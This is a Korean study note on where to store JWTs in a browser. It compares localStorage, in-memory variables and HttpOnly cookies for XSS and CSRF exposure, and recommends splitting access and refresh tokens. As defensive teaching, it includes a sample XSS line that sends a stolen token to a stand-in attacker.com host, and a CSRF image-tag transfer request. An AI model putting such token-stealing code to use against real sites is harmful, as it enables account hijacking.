#Network/HTTP/Security #Network/HTTP #Network/JWT
## 먼저 — [[JWT]]는 암호화된 쿠키가 아니다

이 오해를 먼저 짚고 가야 한다.

```
쿠키:     상태를 저장하는 "장소" (브라우저 저장 메커니즘)
JWT:      상태를 서명된 형태로 담는 "형식" (데이터 포맷)
```

둘은 다른 레이어의 개념이다. JWT를 **쿠키에 저장할 수도 있고**, `localStorage`에 저장할 수도 있다. JWT는 어디에 저장하든 JWT다.

그리고 JWT는 기본적으로 **암호화되지 않는다.** 서명(Signature)만 된다.

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.abc123
        │                     │                │
     Header               Payload           Signature
   (Base64 인코딩)       (Base64 인코딩)    (서버만 검증 가능)
        
// Payload를 Base64 디코딩하면 누구나 읽을 수 있음
{"userId": 1, "role": "ADMIN", "exp": 1714176000}
```

Base64는 암호화가 아니다. 누구나 디코딩할 수 있다. JWT가 보장하는 것은 **"이 내용이 서버가 발급한 것임을 위조할 수 없다"** 는 무결성이지, 내용의 기밀성이 아니다.

> RFC 7519, Section 1: _"JWTs represent a set of claims as a JSON object that is encoded in a JWS and/or JWE structure. This JSON object is the JWT Claims Set."_ (JWT는 JWS 및/또는 JWE 구조로 인코딩된 JSON 객체로 클레임 집합을 표현한다. — JWE를 써야 암호화, 기본 JWT는 JWS로 서명만 함)

---

## 1. Problem First

### JWT를 어디에 저장하느냐가 왜 중요한가

JWT를 발급받으면 브라우저 어딘가에 저장해야 다음 요청에 쓸 수 있다. 그런데 저장 위치마다 **공격 벡터가 다르다.**

웹의 두 가지 대표 공격:

```
XSS (Cross-Site Scripting):
공격자가 페이지에 악성 JS를 심어 브라우저에서 실행
→ JS로 접근 가능한 저장소의 토큰을 탈취

CSRF (Cross-Site Request Forgery):
공격자 사이트에서 피해자 브라우저를 이용해 요청을 위조
→ 브라우저가 자동으로 첨부하는 쿠키를 악용
```

저장 위치에 따라 어떤 공격에 노출되는지가 달라진다. 이것이 저장 방식 선택의 핵심이다.

---

## 2. Mechanics

### 2-1. 저장 위치 세 가지

브라우저에서 JWT를 저장할 수 있는 곳은 크게 세 가지다.

```
브라우저
├── 메모리 (JS 변수)          ← JS 접근 O / 탭 닫으면 소멸
├── localStorage              ← JS 접근 O / 영구 저장
└── 쿠키                      ← 속성에 따라 JS 접근 제어 가능
      ├── HttpOnly 쿠키        ← JS 접근 X
      └── 일반 쿠키            ← JS 접근 O
```

---

### 2-2. localStorage / sessionStorage

```javascript
// 로그인 후 JWT 저장
localStorage.setItem('access_token', jwtToken);

// 이후 요청마다 직접 꺼내서 헤더에 붙임
const token = localStorage.getItem('access_token');
fetch('/api/cart', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**XSS에 완전히 노출된다.**

```javascript
// 공격자가 XSS로 심은 코드 한 줄이면 끝
const stolen = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?token=' + stolen);
```

`localStorage`는 같은 오리진(origin)의 모든 JS가 접근할 수 있다. 내 코드든, 공격자가 심은 코드든, npm 패키지 안에 숨어있는 코드든 구분하지 않는다.

반면 CSRF는 `Authorization` 헤더를 브라우저가 자동으로 붙이지 않으므로 **CSRF에는 안전하다.**

|      | localStorage        |
| ---- | ------------------- |
| XSS  | 취약 (JS로 직접 접근)      |
| CSRF | 안전 (브라우저 자동 전송 안 함) |
| 영속성  | 탭/브라우저 닫아도 유지       |

---

### 2-3. 메모리 (JS 변수)

```javascript
// 모듈 스코프나 클로저에 저장
let accessToken = null;

async function login(credentials) {
  const response = await fetch('/api/login', { ... });
  accessToken = response.token; // 메모리에만 존재
}

async function getCart() {
  fetch('/api/cart', {
    headers: { 'Authorization': `Bearer ${accessToken}` }
  });
}
```

**XSS에 가장 강하다.** 공격자가 `localStorage`처럼 단순히 꺼낼 방법이 없다. 공격자 스크립트가 `accessToken` 변수를 알 수 없기 때문이다 (클로저/모듈 스코프로 보호 시).

**치명적 단점: 탭을 닫으면 사라진다.**

새로고침, 탭 닫기, 브라우저 종료 시 토큰이 소멸한다. 매번 다시 로그인해야 한다는 뜻이다. 실무에서 단독으로 쓰기 어렵고, Refresh Token과 조합한다.

| |메모리|
|---|---|
|XSS|가장 강함 (직접 접근 불가)|
|CSRF|안전|
|영속성|없음 (새로고침 시 소멸)|

---

### 2-4. HttpOnly 쿠키 — 실무에서 가장 많이 쓰이는 방식

```
서버가 Set-Cookie로 발급:

HTTP/1.1 200 OK
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Max-Age=900
            │                                       │        │                           │              │
            JWT 값                     JS접근X   HTTPS만    CSRF방어      15분 만료
```

**`HttpOnly` 플래그가 핵심이다.**

```javascript
// HttpOnly 쿠키는 JS에서 접근 자체가 안 됨
document.cookie; // access_token이 보이지 않음
localStorage;    // 여기도 없음

// 공격자가 XSS로 심어도
document.cookie; // 빈 값 — HttpOnly 쿠키는 JS에 노출 안 됨
```

브라우저가 `HttpOnly` 쿠키를 JS 엔진에서 완전히 숨긴다. XSS 공격으로 탈취 불가능하다.

대신 **브라우저가 자동으로 첨부**하므로 CSRF 위협이 생긴다.

```
공격자 사이트에서:
<img src="https://mybank.com/transfer?to=attacker&amount=1000000">

피해자 브라우저:
→ 이 요청에 HttpOnly 쿠키를 자동으로 붙임
→ 서버는 인증된 요청으로 처리
```

이를 막는 것이 `SameSite` 속성이다.

```
SameSite=Strict: 다른 사이트에서 발생한 요청엔 쿠키를 첨부하지 않음
SameSite=Lax:    GET 요청(링크 클릭 등)엔 허용, POST 등에는 차단
SameSite=None:   모든 요청에 첨부 (Secure와 함께 써야 함)
```

| |HttpOnly 쿠키|
|---|---|
|XSS|안전 (JS 접근 불가)|
|CSRF|`SameSite=Strict`으로 방어 가능|
|영속성|`Max-Age`/`Expires`로 제어 가능|

---

### 2-5. 세 가지 비교 요약

```
공격 벡터 관점:

                XSS 탈취      CSRF 위조     새로고침 생존
localStorage      취약          안전           생존
메모리            안전          안전           소멸 ✗
HttpOnly 쿠키     안전          SameSite 필요   생존
```

어떤 저장소도 완벽하지 않다. **선택은 어떤 위협을 더 중요하게 보는가의 문제**다.

---

### 2-6. 실무 패턴 — Access Token + Refresh Token 분리

토큰 하나만 쓰면 만료 시간 딜레마가 생긴다.

```
만료 시간 짧게 (15분): 보안은 좋지만 15분마다 로그아웃됨
만료 시간 길게 (30일): UX는 좋지만 탈취 시 피해가 큼
```

이를 해결하는 게 **두 토큰 분리** 패턴이다.

```
Access Token:  실제 API 인증에 사용 / 만료 짧게 (15분)
Refresh Token: Access Token 재발급에만 사용 / 만료 길게 (7일~30일)
```

저장 위치를 분리하면 보안을 강화할 수 있다.

```
Access Token  → 메모리 저장
               (XSS 안전, 만료 짧으니 새로고침 시 소멸해도 Refresh로 복구)

Refresh Token → HttpOnly 쿠키 저장
               (JS 접근 불가, SameSite로 CSRF 방어)
               (재발급 엔드포인트에만 전송되도록 Path=/auth/refresh 설정)
```

```
새로고침 시 흐름:

브라우저 새로고침
→ 메모리의 Access Token 소멸
→ /auth/refresh 요청 (HttpOnly 쿠키의 Refresh Token 자동 첨부)
→ 서버: Refresh Token 검증 → 새 Access Token 발급
→ 새 Access Token 메모리에 저장
→ 사용자는 로그인 유지된 것처럼 경험
```

Spring에서의 구현 위치:

```java
@PostMapping("/auth/refresh")
public ResponseEntity<Void> refresh(
        @CookieValue("refresh_token") String refreshToken,  // HttpOnly 쿠키에서
        HttpServletResponse response) {
    
    // Refresh Token 검증
    String userId = jwtProvider.validateRefreshToken(refreshToken);
    
    // 새 Access Token 발급 — 응답 바디로 (JS가 받아서 메모리에 저장)
    String newAccessToken = jwtProvider.createAccessToken(userId);
    return ResponseEntity.ok()
        .header("X-Access-Token", newAccessToken)
        .build();
}
```

---

## 3. 공식 근거

|주장|출처|
|---|---|
|JWT는 서명이지 암호화가 아님 (기본)|RFC 7519, Section 1 — JWS(서명)와 JWE(암호화) 구분|
|HttpOnly 쿠키 정의|RFC 6265, Section 4.1.2.6 — _"The HttpOnly attribute limits the scope of the cookie to HTTP requests"_|
|SameSite 속성 정의|RFC 6265bis (draft), Section 5.3.7|
|CSRF 공격 정의 및 방어|OWASP CSRF Prevention Cheat Sheet|
|localStorage 보안 위험|OWASP HTML5 Security Cheat Sheet — _"Do not store sensitive information in localStorage"_|

---

## 4. 이 설계를 이렇게 한 이유

은탄환은 없다. 저장 방식마다 구체적으로 무엇을 잃는지:

|방식|얻는 것|잃는 것|
|---|---|---|
|localStorage|구현 단순, 영속성|XSS 한 방에 전체 탈취|
|메모리|XSS 가장 안전|새로고침마다 재인증 필요, Refresh Token 패턴 필수|
|HttpOnly 쿠키|XSS 안전, 영속성|CSRF 고려 필요, 모바일 앱에서 쿠키 관리 복잡|
|Access+Refresh 분리|보안과 UX 균형|구현 복잡도 증가, Refresh Token 탈취 시 장기 피해|

---

## 5. 이어지는 개념

|순서|개념|이유|
|---|---|---|
|**1**|**XSS 공격 원리와 방어 (CSP 헤더)**|저장 방식 선택의 전제가 XSS 이해다. `Content-Security-Policy` 헤더로 XSS 자체를 막는 것이 저장소 선택보다 상위 방어선|
|**2**|**CSRF 공격 원리와 `SameSite` / CSRF Token**|HttpOnly 쿠키를 쓰면 반드시 CSRF를 고려해야 한다. Spring Security의 CSRF 방어가 내부에서 어떻게 동작하는지|
|**3**|**Spring Security JWT 필터 구현**|지금까지의 개념이 코드로 어떻게 연결되는지. `OncePerRequestFilter`로 토큰 검증하는 실제 구현|